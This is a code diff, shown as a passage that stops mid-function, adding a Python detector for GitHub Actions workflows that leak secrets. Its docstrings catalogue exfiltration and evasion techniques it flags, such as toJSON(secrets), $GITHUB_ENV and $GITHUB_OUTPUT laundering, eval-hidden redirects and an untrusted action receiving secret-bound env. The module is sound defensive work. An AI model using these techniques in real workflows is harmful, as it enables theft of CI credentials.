@@ -1,0 +1,1564 @@
+"""Detector for ``gha_secret_flow`` — a GitHub Actions workflow has
+a data path from ``secrets.*`` (or a secret-bound ``env.*``) to a
+sink that lets the secret leave the runner: an arbitrary ``run:``
+shell block, ``actions/upload-artifact``, an unknown action's
+``with:`` input, or a step output.
+
+This is the substrate-level companion to ``gha_drift`` (which checks
+action pinning) and ``workflow_signing`` (which checks signing
+posture).  Neither of those catches the actual data-flow shape that
+Iron Worm and similar exfil-via-CI attacks use; this detector does.
+
+# Adversarial model
+
+What this detector must defend against:
+
+  * **toJSON(secrets) — the unambiguous evasion-by-aggregation** —
+    no legitimate workflow has reason to enumerate ALL secrets.  We
+    treat any reference to ``toJSON(secrets)`` (or ``toJson``, the
+    cased variant) as a high-severity anchor regardless of where it
+    flows.  Near-zero FP.
+
+  * **Computed secret access** — ``secrets[github.event.inputs.x]``,
+    ``env[name]``.  We can't statically resolve these.  Defence: we
+    flag the SHAPE itself — there's no legitimate static reason for
+    a workflow to compute the secret name, so the construct is
+    suspicious on its own merit.
+
+  * **Env binding then env use** — step A binds ``env: NPM_TOKEN:
+    ${{ secrets.NPM_TOKEN }}``; step B uses ``$NPM_TOKEN`` in a
+    ``run:`` block.  Defence: we track per-job env bindings derived
+    from secrets and treat ``env.NPM_TOKEN`` references in later
+    steps as secret-tainted within the same job.  Bindings DON'T
+    cross job boundaries.
+
+  * **Nested env JSON** — ``${{ toJSON(env) }}`` after binding a
+    secret to env effectively exfiltrates the secret too.  Defence:
+    when ANY env binding in the same job derives from a secret, we
+    treat ``toJSON(env)`` as a sink.
+
+  * **Untrusted action + secret-bound job env, no tainted inputs**
+    — DELIBERATELY NOT FLAGGED (accepted-miss trade-off).  A job
+    with ``env: NPM_TOKEN: ${{ secrets.NPM_TOKEN }}`` running
+    ``uses: attacker/action@v1`` with no ``with:`` block exports
+    the job env to the action's process, which can read the secret
+    directly.  Job-level env taint is only consulted for the
+    ``actions/upload-artifact`` / ``actions/cache`` sinks: flagging
+    EVERY non-allowlisted action inside an env-tainted job would
+    fire on the dominant legitimate CI shape (job-scoped tokens +
+    third-party build/setup actions) and drown the high-signal
+    rows.  Mitigations that still apply: the action ref itself is
+    covered by gha_drift (mutable ref) / gha_freshness; a ``with:``
+    input carrying the secret IS flagged.  Revisit if a
+    per-action-reputation signal lands.
+
+  * **Custom local actions** — ``uses: ./.github/actions/foo``.
+    These bypass the trusted-consumer allowlist because they're
+    project-local; we conservatively treat them as UNTRUSTED (the
+    action's body is in-tree and could exfiltrate the secret it
+    receives) — emit a finding but mark it ``confidence=medium``
+    so operators can dismiss after reviewing.  A correct
+    interpretation would recurse into ``./.github/actions/foo/action.yml``
+    — left for a follow-on.
+
+  * **Reusable workflows** — invoked at JOB level:
+    ``jobs.<id>.uses: org/repo/.github/workflows/foo.yml@ref`` with
+    ``secrets: inherit`` (forwards EVERY repository secret) or an
+    explicit ``secrets:`` map.  Defence: emit a low-severity
+    informational ``reusable_workflow_inherit`` finding naming the
+    forwarded secrets (cross-workflow flow is out of static scope
+    here).  A ``.yml``-suffixed STEP-level ``uses:`` is not valid
+    GHA; if one appears it is treated as an untrusted action.
+
+  * **echo-with-mask** — ``run: echo "::add-mask::${{ secrets.X }}"``
+    is the canonical legitimate use of a secret in a ``run:`` body.
+    Defence: recognise this exact shape and suppress the mask
+    occurrence ONLY.  ``add-mask`` merely redacts the value from log
+    output, so any OTHER reference to the same secret in the body
+    (e.g. a curl that posts it) still counts — a mask line must not
+    grant the rest of the body cover.
+
+  * **Token-cache-poisoning** — ``actions/cache@save`` with a path
+    written by a step that consumed a secret.  We treat
+    ``actions/cache`` as a sink unless the secret was consumed
+    only by a trusted action earlier in the same job.
+
+  * **Cross-step laundering via ``$GITHUB_ENV``** — an earlier step
+    writes ``KEY=<secret-derived>`` to ``$GITHUB_ENV``; subsequent
+    steps in the same job see ``KEY`` as a normal env var with no
+    obvious secret reference at the call site.  Defence: when we
+    see ``KEY=<tainted>`` redirected into ``$GITHUB_ENV``, we add
+    ``KEY`` to the job's ``secret_bound_env`` so later sinks treat
+    references to it as tainted just like a direct
+    ``env: KEY: ${{ secrets.X }}`` binding.  The laundering step
+    itself doesn't fire — the downstream sink does.  GitHub's
+    documented MULTILINE env-file framing (``KEY<<DELIM`` written
+    to the target, value lines, then the bare delimiter) binds
+    ``KEY`` the same way when any interior content is tainted —
+    both the grouped one-liner and the per-line three-append
+    spellings.
+
+  * **Cross-step laundering via ``$GITHUB_OUTPUT``** — an earlier
+    step (with an ``id:``) writes ``KEY=<secret-derived>`` to
+    ``$GITHUB_OUTPUT``; downstream steps reference
+    ``${{ steps.<id>.outputs.KEY }}`` — same shape as direct secret
+    flow.  Defence: track per-step tainted outputs in the job
+    context; treat ``steps.<id>.outputs.KEY`` references as
+    secret-tainted in ``with:`` inputs and ``run:`` bodies.
+
+# Soundness invariant
+
+A finding from this detector means: "this workflow has a statically-
+visible path from a secret reference to a sink that lets data leave
+the runner."  It does NOT mean the workflow is necessarily
+malicious — some legitimate publishers DO need to upload signed
+artifacts that contain secrets internally — but every such case is
+worth review.
+"""
+
+from __future__ import annotations
+
+import json
+import logging
+import re
+from collections.abc import Sequence
+from dataclasses import dataclass, field
+from pathlib import Path
+
+from core.json import load_json_bounded
+
+from .._yaml_fast import safe_load
+from ..models import Confidence, Dependency, Manifest, PinStyle
+from ..parsers import _safe_read
+
+logger = logging.getLogger(__name__)
+
+
+# DoS bounds — defend against malicious workflow YAML that could
+# otherwise exhaust CPU or memory in the redirect-block parser.
+# A typical legitimate ``run:`` body is < 5 KB; even very large
+# CI scripts rarely exceed 50 KB.  The bounds below are 10x typical
+# upper bounds to give legitimate workflows room while ensuring an
+# attacker can't drive the parser into pathological territory.
+_MAX_RUN_BODY_BYTES = 500_000       # ~500 KB per ``run:`` block
+_MAX_EVAL_RECURSION_DEPTH = 4       # eval-of-eval-of-eval-of-eval
+_MAX_REDIRECT_BLOCKS_PER_BODY = 200 # cap on extracted blocks per body
+_MAX_WORKFLOW_YAML_BYTES = 2_000_000  # ~2 MB workflow file
+_MAX_BALANCED_WALK_BYTES = 100_000  # ``_find_balanced`` walk limit
+_MAX_HEREDOC_BODY_BYTES = 100_000   # per-heredoc close-search window
+
+
+# Trusted-consumer allowlist (lazy-loaded from
+# data/gha_trusted_secret_consumers.json). Hand-curated AND
+# suppression-direction (a listed action's secret flow is not
+# flagged) — accepted deliberately: "which actions legitimately
+# receive secrets" is inherently operator judgment with no
+# mechanical source to derive from. Review trigger: when a listed
+# action changes ownership/publisher or a new secret-consuming
+# action becomes common enough that operators keep hand-waiving it,
+# adjudicate the JSON entry — never auto-extend.
+_TRUSTED: set[str] | None = None
+
+
+def _trusted_consumers() -> set[str]:
+    global _TRUSTED
+    if _TRUSTED is not None:
+        return _TRUSTED
+    path = (
+        Path(__file__).resolve().parents[1]
+        / "data" / "gha_trusted_secret_consumers.json"
+    )
+    try:
+        # Repo-bundled data file; ValueError also covers the
+        # byte-budget refusal.
+        data = load_json_bounded(path, max_bytes=8 * 1024 * 1024)
+    except (OSError, ValueError):
+        _TRUSTED = set()
+        return _TRUSTED
+    _TRUSTED = set(data.get("trusted", []))
+    return _TRUSTED
+
+
+def _action_name(uses: str) -> str:
+    """Strip the ``@ref`` to get the bare action name.  Local actions
+    (``./.github/actions/foo``) keep their ``./`` prefix so callers
+    can distinguish them from registry actions."""
+    return uses.split("@", 1)[0].strip()
+
+
+# Regex for ``${{ secrets.X }}`` references.  Permissive on whitespace
+# inside the ``${{ }}``.  ``toJSON``/``toJson`` (cased / uncased)
+# treated identically.
+_SECRETS_LITERAL_RE = re.compile(
+    r"\$\{\{\s*secrets\.[A-Za-z_][A-Za-z0-9_]*\s*\}\}"
+)
+# The key body is bounded: an unbounded ``[^\]]+`` re-scans every
+# planted ``${{ secrets[`` opener inside an unclosed access —
+# quadratic on hostile workflow text. 256 is far above any real
+# computed-key expression; a longer body stops matching.
+_SECRETS_DICT_RE = re.compile(
+    r"\$\{\{\s*secrets\[[^\]]{1,256}\]\s*\}\}"    # computed access
+)
+_TOJSON_SECRETS_RE = re.compile(
+    r"\$\{\{\s*toJSON\s*\(\s*secrets\s*\)\s*\}\}",
+    re.IGNORECASE,
+)
+# Expression interiors + the unanchored reference grammars used to
+# scan INSIDE them. format()/join()/fromJSON() are first-class GHA
+# expression functions any workflow author can write, so anchoring
+# ``secrets.`` to sit immediately after ``${{`` (the literal regexes
+# above) silently missed every wrapped reference at the two
+# highest-severity sinks — ``${{ format('{0}', secrets.X) }}`` was
+# a complete evasion. The taint-laundering path (_value_is_tainted)
+# always had the permissive grammar; the sinks now share it, scoped
+# to ``${{ … }}`` interiors so prose mentioning ``secrets.FOO``
+# outside an expression can't false-positive.
+# The expression body is bounded: a lazy unbounded body re-scans the
+# rest of a hostile workflow from every planted ``${{`` opener with no
+# closer — quadratic. Real GitHub expressions sit far below 2000
+# chars; a longer body simply keeps that decoy span from matching.
+_EXPR_RE = re.compile(r"\$\{\{(.{0,2000}?)\}\}", re.DOTALL)
+_SECRETS_NAME_RE = re.compile(r"\bsecrets\.([A-Za-z_][A-Za-z0-9_]*)")
+_TOJSON_SECRETS_INNER_RE = re.compile(
+    r"\btoJSON\s*\(\s*secrets\s*\)", re.IGNORECASE,
+)
+
+
+def _expression_secret_refs(text: str) -> list[str]:
+    """Secret names referenced anywhere inside ``${{ … }}``
+    expressions in ``text``; a ``toJSON(secrets)`` whole-context
+    reference is reported as ``"*"`` (all secrets)."""
+    out: list[str] = []
+    for m in _EXPR_RE.finditer(text):
+        inner = m.group(1)
+        out.extend(
+            nm.group(1) for nm in _SECRETS_NAME_RE.finditer(inner)
+        )
+        if _TOJSON_SECRETS_INNER_RE.search(inner):
+            out.append("*")
+    return out
+
+
+_TOJSON_ENV_RE = re.compile(
+    r"\$\{\{\s*toJSON\s*\(\s*env\s*\)\s*\}\}",
+    re.IGNORECASE,
+)
+# Detect a secret-derived env reference like ``env.NPM_TOKEN`` in a
+# template expression (uses + with-form), or ``$NPM_TOKEN`` / ``${NPM_TOKEN}``
+# in a shell body.
+_ENV_TEMPLATE_RE = re.compile(
+    r"\$\{\{\s*env\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}"
+)
+_ENV_SHELL_RE = re.compile(
+    r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?"
+)
+# Mask-line shape that legitimately consumes a secret in a run block.
+# Matches the WHOLE ``echo "::add-mask::${{ secrets.X }}"`` occurrence
+# so it can be excised from the body before reference scanning: only
+# the mask occurrence itself is exempt.  ``::add-mask::`` hides the
+# value from LOG OUTPUT only — it does nothing to stop the same
+# secret being exfiltrated by another command, so other references to
+# a masked secret must still count.
+_MASK_RE = re.compile(
+    r'echo\s+"?::add-mask::\$\{\{\s*secrets\.[A-Za-z_][A-Za-z0-9_]*\s*\}\}"?'
+)
+# ``${{ steps.<id>.outputs.<name> }}`` — a downstream reference to
+# a previous step's output.  Used in both ``with:`` inputs and
+# ``run:`` bodies; we taint the reference when the prior step
+# tainted that output.
+_STEPS_OUTPUT_RE = re.compile(
+    r"\$\{\{\s*steps\.([A-Za-z_][A-Za-z0-9_-]*)"
+    r"\.outputs\.([A-Za-z_][A-Za-z0-9_-]*)\s*\}\}"
+)
+# ``KEY=VALUE`` shape within an ``echo "..."`` / ``printf "..."``
+# argument or a bare ``KEY=value`` ahead of a redirect.  Captures
+# the key and value-up-to-quote-or-newline.
+_KEY_VALUE_RE = re.compile(
+    r'(?:^|["\s])'
+    r'([A-Za-z_][A-Za-z0-9_]*)\s*=\s*'
+    r'([^"\n>]*)'
+)
+
+
+def _multi_redirect_target_pattern(targets: Sequence[str]) -> str:
+    """Regex source matching ``$NAME`` or ``${!NAME}`` (bash
+    variable-indirection) for ANY name in ``targets``.
+
+    Used after expanding shell-var aliases — when a body does
+    ``T=$GITHUB_ENV`` then ``... >> $T``, we want ``$T`` to count as
+    a redirect to ``GITHUB_ENV`` too.  ``${!NAME}`` is matched in
+    parallel so an attacker who launders via
+    ``T=GITHUB_ENV; ... >> ${!T}`` is also caught.  The ``!`` is
+    optional in the ``${}`` form via ``!?``.
+    """
+    alt = "|".join(re.escape(t) for t in targets)
+    return rf'"?\$\{{?!?(?:{alt})\}}?"?'
+
+
+_MAX_ALIAS_CHAIN_DEPTH = 6
+# Cap on the alias set tracked per body. Legitimate run bodies alias
+# the redirect target a handful of times at most; the cap bounds both
+# the combined alternation pattern below and the downstream
+# ``_multi_redirect_target_pattern`` alternation, so a body stuffed
+# with thousands of ``Vn=$GITHUB_ENV`` assignments can't inflate
+# pattern size or scan cost.
+_MAX_ALIAS_SET_SIZE = 64
+
+
+def _aliased_targets(body: str, target: str) -> list[str]:
+    """Find local shell-var names that hold ``$TARGET`` (transitively)
+    or that hold the LITERAL string ``TARGET`` (which bash variable
+    indirection ``${!VAR}`` would dereference back to the target).
+
+    Matches three transitive patterns:
+
+      1. **Direct alias**: ``VAR=$TARGET`` / ``VAR="$TARGET"`` /
+         ``VAR=${TARGET}`` / ``VAR="${TARGET}"`` and the
+         ``export`` / ``declare`` / ``local`` prefixed variants.
+      2. **Chained alias**: ``A=$TARGET; B=$A`` — A is in the
+         direct-alias set; B then becomes an alias of A.  Iterated
+         up to ``_MAX_ALIAS_CHAIN_DEPTH`` hops to defend against
+         pathological chain depth without missing realistic shapes.
+      3. **Indirection target**: ``T=TARGET`` (literal value match,
+         no ``$``) makes ``${!T}`` evaluate to ``$TARGET``.  We
+         treat such ``T`` as an alias so a downstream redirect via
+         ``${!T}`` is detected.
+
+    Documented gap (out of scope):
+      * Quote-concatenation indirection: ``T="$"; ... >> "${T}TARGET"``
+        — composed at parse time; would require evaluating arbitrary
+        string concatenations.  Attacker using this is in the same
+        evasion regime as ``eval``-laundered redirects (cost is
+        higher than the protection it adds against detection).
+
+    Returns the list of all alias names (excluding the original
+    ``target``).
+    """
+    # Direct-alias / chained-alias detection — iterated reachability.
+    # Use a negative lookahead after the alias name so ``$A1`` doesn't
+    # match ``$A10``/``$A11`` (would otherwise cause both an alias-set
+    # explosion AND incorrect VAR-name captures).
+    #
+    # One combined alternation pattern per iteration (all current
+    # aliases OR'd together) rather than one full-body scan per alias:
+    # keeps the invariant "O(depth) full-body scans regardless of
+    # alias count" — a 500 KB body with thousands of alias
+    # assignments would otherwise trigger thousands of full-body
+    # scans on iteration 2.
+    aliases = {target}
+    for _ in range(_MAX_ALIAS_CHAIN_DEPTH):
+        if len(aliases) >= _MAX_ALIAS_SET_SIZE:
+            break
+        alt = "|".join(re.escape(a) for a in sorted(aliases))
+        alias_re = re.compile(
+            r'(?:^|[\s;&|({])'
+            r'(?:export\s+|declare\s+(?:-[\w]+\s+)*|local\s+)?'
+            r'([A-Za-z_][A-Za-z0-9_]*)\s*=\s*'
+            rf'"?\$\{{?(?:{alt})'
+            r'(?![A-Za-z0-9_])'
+            r'\}?"?'
+        )
+        new = set()
+        for m in alias_re.finditer(body):
+            new.add(m.group(1))
+        if not (new - aliases):
+            break
+        aliases |= new
+        if len(aliases) > _MAX_ALIAS_SET_SIZE:
+            # Deterministic truncation (sorted) — keeps the target
+            # itself; which surplus aliases drop is arbitrary but
+            # stable across runs.
+            aliases = {target} | set(
+                sorted(aliases - {target})[:_MAX_ALIAS_SET_SIZE - 1]
+            )
+            break
+    # Indirection target — ``T=TARGET`` literal (no leading ``$``).
+    # ``${!T}`` then dereferences to the value of TARGET.  Same
+    # word-boundary lookahead so ``T=GITHUB_ENVIRONMENT`` doesn't
+    # alias.
+    indir_re = re.compile(
+        r'(?:^|[\s;&|({])'
+        r'(?:export\s+|declare\s+(?:-[\w]+\s+)*|local\s+)?'
+        rf'([A-Za-z_][A-Za-z0-9_]*)\s*=\s*"?{re.escape(target)}'
+        r'(?![A-Za-z0-9_])'
+        r'"?'
+        r'(?:\s|;|$)'
+    )
+    for m in indir_re.finditer(body):
+        aliases.add(m.group(1))
+        if len(aliases) > _MAX_ALIAS_SET_SIZE:
+            break
+    return list(aliases - {target})
+
+
+_EVAL_RE = re.compile(
+    r"""
+    \b(?:eval|bash\s+-c|sh\s+-c|/bin/(?:ba)?sh\s+-c)\s+
+    (?:"((?:[^"\\]|\\.)*)" | '((?:[^'\\]|\\.)*)')
+    """,
+    re.VERBOSE,
+)
+
+
+def _eval_arg_strings(body: str) -> list[str]:
+    """Extract the QUOTED ARGUMENT of every ``eval``/``bash -c`` /
+    ``sh -c`` invocation in ``body``.
+
+    The argument is itself a shell program — an attacker who hides
+    a ``>> $GITHUB_ENV`` redirect inside this string evades the
+    surface scan.  We extract the strings so the redirect-block
+    scanner can recurse over them.
+
+    Handles double-quoted and single-quoted forms with standard
+    backslash escapes; misses ``eval $VAR`` and ``eval cmd``
+    (unquoted), which are less common in attack writeups.
+    """
+    out: list[str] = []
+    for m in _EVAL_RE.finditer(body):
+        arg = m.group(1) or m.group(2) or ""
+        # Decode the most common escape sequences without invoking
+        # a real shell parser.
+        arg = (
+            arg.replace("\\n", "\n").replace("\\t", "\t")
+               .replace('\\"', '"').replace("\\'", "'")
+               .replace("\\$", "$")
+        )
+        out.append(arg)
+    return out
+
+
+def _find_balanced(masked: str, open_ch: str, close_ch: str,
+                   start: int) -> int:
+    """Return the index of the matching CLOSE for the bracket at
+    ``masked[start]`` (which must equal ``open_ch``), respecting
+    nested same-kind brackets.  Returns ``-1`` when unbalanced.
+
+    Pure stdlib substitute for a real bash parser — handles the
+    nested-bracket case the regex ``[^{}]*`` couldn't.  Does NOT
+    track other shell-syntax niceties (quotes, comments) because
+    those are rare-to-absent in workflow ``run:`` bodies.
+    """
+    depth = 0
+    i = start
+    n = min(len(masked), start + _MAX_BALANCED_WALK_BYTES)
+    while i < n:
+        c = masked[i]
+        if c == open_ch:
+            depth += 1
+        elif c == close_ch:
+            depth -= 1
+            if depth == 0:
+                return i
+        i += 1
+    return -1
+
+
+def _balanced_blocks(masked: str, body: str,
+                     open_ch: str, close_ch: str,
+                     redirect_pat: str) -> list[str]:
+    """Find every balanced ``open_ch ... close_ch`` region whose
+    closer is followed (skipping whitespace) by a match of
+    ``redirect_pat``.  Returns the INTERIOR content sliced from
+    the ORIGINAL body."""
+    redirect_after_re = re.compile(rf"^\s*{redirect_pat}")
+    blocks: list[str] = []
+    i = 0
+    n = len(masked)
+    while i < n:
+        if masked[i] != open_ch:
+            i += 1
+            continue
+        close = _find_balanced(masked, open_ch, close_ch, i)
+        if close < 0:
+            break
+        # Is the redirect right after the close?
+        if redirect_after_re.match(masked[close + 1:]):
+            # Slice INTERIOR from ORIGINAL body.
+            blocks.append(body[i + 1:close])
+        i = close + 1
+    return blocks
+
+
+def _mask_gha_exprs(body: str) -> str:
+    """Replace every ``${{ ... }}`` region with same-length filler
+    characters that contain no shell brace metachar.
+
+    GHA expression syntax (``${{ secrets.X }}``) embeds literal
+    ``{{`` and ``}}`` inside what bash sees as a single
+    parameter-expansion-or-text token.  Our non-nested brace
+    balancers (``[^{}]*`` for groups, etc.) would otherwise treat
+    those braces as bash group/parameter delimiters and break the
+    block boundaries.  Masking preserves character positions so the
+    caller can re-slice the ORIGINAL body once a boundary is
+    found in the masked one.
+    """
+    out: list[str] = []
+    i = 0
+    n = len(body)
+    while i < n:
+        if body[i:i + 3] == "${{":
+            close = body.find("}}", i + 3)
+            if close == -1:
+                out.append(body[i])
+                i += 1
+                continue
+            # Replace the ENTIRE ``${{ ... }}`` region with
+            # underscores; same length so positions stay aligned.
+            out.append("_" * (close + 2 - i))
+            i = close + 2
+        else:
+            out.append(body[i])
+            i += 1
+    return "".join(out)
+
+
+def _extract_redirect_blocks(
+    body: str, target: str, _depth: int = 0,
+) -> list[str]:
+    r"""Return text blocks whose content flows into ``$TARGET``
+    (``GITHUB_ENV`` or ``GITHUB_OUTPUT``) via any of the bash redirect
+    shapes commonly used in workflow `run:` blocks.
+
+    Covers:
+      * per-line — ``echo "X=Y" >> $TARGET``
+      * group — ``{ echo X=Y; echo Z=W; } >> $TARGET`` (nested OK)
+      * subshell — ``( ... ) >> $TARGET`` (nested OK)
+      * heredoc — ``cat <<EOF >> $TARGET\n X=Y\n EOF`` (with
+        ``<<-`` and quoted-delim variants)
+      * tee — ``echo X=Y | tee -a $TARGET`` (the piped command is
+        the block)
+      * target-via-variable: ``T=$TARGET; ... >> $T`` (single-hop
+        aliasing — chained aliases ``A=$T; B=$A`` are out of scope)
+      * dynamic eval: ``eval "echo X=Y >> $TARGET"`` (the eval
+        argument is recursively scanned)
+
+    Still NOT covered (documented for the next adversarial pass):
+      * Quote concatenation: ``T="$"; ... >> "${T}GITHUB_ENV"``
+        (chained aliases and ``${!T}`` variable indirection ARE
+        covered — see ``_aliased_targets``)
+
+    Adversarial: each new evasion shape we close raises the cost of
+    the next one.  The remaining gaps require either bash-parser-
+    accurate evaluation or shell semantics we won't replicate.
+
+    DoS bounds (enforced here):
+      * ``body`` is capped to ``_MAX_RUN_BODY_BYTES`` before parsing
+      * eval-recursion depth capped by ``_depth`` parameter
+      * total extracted blocks capped by
+        ``_MAX_REDIRECT_BLOCKS_PER_BODY``
+    """
+    # DoS bound — clip oversized run bodies BEFORE any expensive
+    # regex work.  An attacker who ships a 100 MB workflow with one
+    # giant ``run:`` block can't drive us into pathological territory.
+    if len(body) > _MAX_RUN_BODY_BYTES:
+        logger.debug(
+            "sca.supply_chain.gha_secret_flow: run body of %d bytes "
+            "exceeds %d-byte cap; truncating (DoS bound)",
+            len(body), _MAX_RUN_BODY_BYTES,
+        )
+        body = body[:_MAX_RUN_BODY_BYTES]
+    if _depth > _MAX_EVAL_RECURSION_DEPTH:
+        # An attacker who nests ``eval "eval \"...\""`` many levels
+        # deep can't drive us into infinite recursion.  At this
+        # depth we stop recursing — outer layers' bindings are
+        # already captured.
+        return []
+    # Mask ``${{ ... }}`` so its embedded braces don't break the
+    # bash-syntax brace balancer; positions stay aligned so we can
+    # slice the ORIGINAL body for content extraction.
+    masked = _mask_gha_exprs(body)
+    # Expand to all alias names that point at $TARGET so subsequent
+    # redirect-shape matchers treat ``$ALIAS`` and ``$TARGET``
+    # interchangeably within this body's scope.
+    aliases = _aliased_targets(body, target)
+    # Same cap as ``_aliased_targets`` — belt-and-braces so the
+    # ``_multi_redirect_target_pattern`` alternation stays bounded
+    # even if the alias source ever changes.
+    target_alts = [target, *aliases][:_MAX_ALIAS_SET_SIZE]
+    target_pat = _multi_redirect_target_pattern(target_alts)
+    redirect_pat = rf'>>?\s*{target_pat}'
+    tee_pat = rf'\|\s*tee\s+(?:-a\s+)?{target_pat}'
+    redirect_re = re.compile(redirect_pat)
+    tee_re = re.compile(tee_pat)
+    blocks: list[str] = []
+
+    # Heredoc — hand-rolled linear scan.  The regex finditer version
+    # had an O(n²) worst case when many ``<<DELIM`` openers had no
+    # matching close — each opener's ``(.*?)\n\1`` search walked to
+    # end-of-body.  We instead advance a cursor; each opener that
+    # passes the same-line redirect check looks for the closer in
+    # the next ``_MAX_HEREDOC_BODY_BYTES`` bytes only.
+    opener_re = re.compile(r"<<-?\s*['\"]?(\w+)['\"]?")
+    redirect_after_open_re = re.compile(redirect_pat)
+    i = 0
+    n_masked = len(masked)
+    # Cap heredoc-opener processing per body.  Pathological inputs
+    # can't trigger thousands of openers worth of work.
+    heredocs_processed = 0
+    while i < n_masked and heredocs_processed < _MAX_REDIRECT_BLOCKS_PER_BODY:
+        # Quick scan for next ``<<``.
+        idx = masked.find("<<", i)
+        if idx < 0:
+            break
+        m = opener_re.match(masked, idx)
+        if m is None:
+            i = idx + 2
+            continue
+        # Opener line is from ``idx`` to the next newline.  The
+        # redirect target MUST appear on this same line.
+        line_end = masked.find("\n", m.end())
+        if line_end < 0:
+            break
+        opener_line = masked[idx:line_end]
+        if redirect_after_open_re.search(opener_line) is None:
+            i = line_end + 1
+            continue
+        # Found a heredoc that targets us.  Look for the closer on
+        # its own line within the next ``_MAX_HEREDOC_BODY_BYTES``.
+        delim = m.group(1)
+        body_start = line_end + 1
+        search_end = min(n_masked, body_start + _MAX_HEREDOC_BODY_BYTES)
+        close_re = re.compile(
+            rf"\n[ \t]*{re.escape(delim)}[ \t]*(?:\n|$)"
+        )
+        close = close_re.search(masked, body_start, search_end)
+        if close is not None:
+            blocks.append(body[body_start:close.start()])
+            i = close.end()
+        else:
+            # No matching close within the bounded search window.
+            # Skip past the opener line and continue.
+            i = body_start
+        heredocs_processed += 1
+
+    # Group write — nesting-aware via manual brace balancer.
+    blocks.extend(_balanced_blocks(masked, body, "{", "}", redirect_pat))
+
+    # Subshell write — nesting-aware.
+    blocks.extend(_balanced_blocks(masked, body, "(", ")", redirect_pat))
+
+    # Tee — the piped command is the relevant block.  Find the
+    # statement-boundary preceding the pipe (newline or ``;``); the
+    # command between that boundary and the pipe is the block.
+    for m in tee_re.finditer(masked):
+        start = max(
+            body.rfind("\n", 0, m.start()),
+            body.rfind(";", 0, m.start()),
+        )
+        start = max(start, 0)
+        blocks.append(body[start:m.start()])
+
+    # Per-line — catches simple ``<cmd> >> $TARGET`` lines.  Skip
+    # heredoc OPENER lines (which carry the redirect but the actual
+    # payload is in the heredoc body already captured above).
+    # Per-line uses ORIGINAL body — masking doesn't help here and
+    # would erase the ``${{ secrets.X }}`` content the KEY=VALUE
+    # extractor needs to see.
+    for line in body.split("\n"):  # line-model: YAML scalar loading already normalised line breaks to \n
+        if not redirect_re.search(line):
+            continue
+        if "<<" in line:
+            continue
+        blocks.append(line)
+
+    # Dynamic eval: recurse into each eval/bash-c/sh-c argument
+    # string.  This catches an attacker hiding the entire redirect
+    # shape inside an eval'd string.  Each recursion uses the SAME
+    # target so the eval body's bindings inherit the outer body's
+    # taint context indirectly through ``_value_is_tainted`` later.
+    for eval_arg in _eval_arg_strings(body):
+        blocks.extend(
+            _extract_redirect_blocks(eval_arg, target, _depth + 1),
+        )
+
+    # DoS bound — total extracted blocks capped.  Adversary can't
+    # blow up downstream KEY=VALUE scanning by stuffing the body
+    # with thousands of redirect targets.
+    if len(blocks) > _MAX_REDIRECT_BLOCKS_PER_BODY:
+        logger.debug(
+            "sca.supply_chain.gha_secret_flow: extracted %d redirect "
+            "blocks (cap %d); truncating (DoS bound)",
+            len(blocks), _MAX_REDIRECT_BLOCKS_PER_BODY,
+        )
+        blocks = blocks[:_MAX_REDIRECT_BLOCKS_PER_BODY]
+
+    return blocks
+
+
+# Redirect-destination token names — never KEY bindings themselves.
+_TARGET_TOKEN_NAMES = ("GITHUB_ENV", "GITHUB_OUTPUT", "GITHUB_PATH")
+
+# GitHub's documented multiline env-file framing: writing
+# ``KEY<<DELIM`` to the target opens a frame; everything written
+# until the bare delimiter is KEY's value. The ``KEY`` sits
+# immediately before ``<<`` (a real shell heredoc is spelled with
+# whitespace before ``<<`` and is handled by the heredoc block arm).
+# The key is pinned to its identifier-run start: unpinned, every
+# position of a hostile identifier run starts a fresh scan for the
+# ``<<`` that never comes — quadratic. The only match-set delta is
+# mid-word starts (a key glued to a preceding word char), which the
+# documented env-file framing never produces.
+_KEY_HEREDOC_OPEN_RE = re.compile(
+    r"(?<![A-Za-z0-9_])([A-Za-z_][A-Za-z0-9_]*)<<-?['\"]?([A-Za-z_][A-Za-z0-9_]*)"
+)
+
+
+def _extract_envfile_multiline_writes(
+    body: str, target: str,
+) -> list[tuple]:
+    """Extract ``[(key, interior)]`` pairs from GitHub's documented
+    multiline env-file syntax (``KEY<<DELIM`` … ``DELIM`` written to
+    the target) — grouped one-liners and the per-line three-append
+    spelling the GitHub docs show. The interior is handed to the
+    caller's taint check verbatim; only content actually redirected
+    to the target participates."""
+    if len(body) > _MAX_RUN_BODY_BYTES:
+        body = body[:_MAX_RUN_BODY_BYTES]
+    aliases = _aliased_targets(body, target)
+    target_alts = [target, *aliases][:_MAX_ALIAS_SET_SIZE]
+    target_pat = _multi_redirect_target_pattern(target_alts)
+    redirect_re = re.compile(rf">>?\s*{target_pat}")
+    tee_re = re.compile(rf"\|\s*tee\s+(?:-a\s+)?{target_pat}")
+    pairs: list[tuple] = []
+    open_key: str | None = None
+    close_re: re.Pattern[str] | None = None
+    parts: list[str] = []
+    for line in body.split("\n"):  # line-model: YAML scalar loading already normalised line breaks to \n
+        rm = redirect_re.search(line) or tee_re.search(line)
+        if rm is None:
+            # Content not written to the target — not part of the
+            # env-file stream, frame state unchanged.
+            continue
+        content = line[:rm.start()]
+        pos = 0
+        while True:
+            if open_key is None:
+                m = _KEY_HEREDOC_OPEN_RE.search(content, pos)
+                if m is None or m.group(1) in _TARGET_TOKEN_NAMES:
+                    break
+                open_key = m.group(1)
+                close_re = re.compile(
+                    rf"(?<![A-Za-z0-9_]){re.escape(m.group(2))}"
+                    rf"(?![A-Za-z0-9_])"
+                )
+                parts = []
+                pos = m.end()
+            else:
+                assert close_re is not None
+                c = close_re.search(content, pos)
+                if c is None:
+                    parts.append(content[pos:])
+                    break
+                parts.append(content[pos:c.start()])
+                pairs.append((open_key, "\n".join(parts)))
+                open_key = None
+                close_re = None
+                parts = []
+                pos = c.end()
+                if len(pairs) > _MAX_REDIRECT_BLOCKS_PER_BODY:
+                    return pairs[:_MAX_REDIRECT_BLOCKS_PER_BODY]
+    return pairs
+
+
+def _extract_redirected_writes(
+    body: str, target: str,
+) -> list[tuple]:
+    """Extract ``[(key, value)]`` pairs written to a target
+    (``GITHUB_ENV`` / ``GITHUB_OUTPUT``) across all supported
+    redirect shapes, including the documented multiline
+    ``KEY<<DELIM`` env-file framing."""
+    pairs: list[tuple] = []
+    for block in _extract_redirect_blocks(body, target):
+        for m in _KEY_VALUE_RE.finditer(block):
+            key = m.group(1)
+            value = m.group(2).strip().strip('"').strip("'")
+            # Drop the special token names — these are the redirect
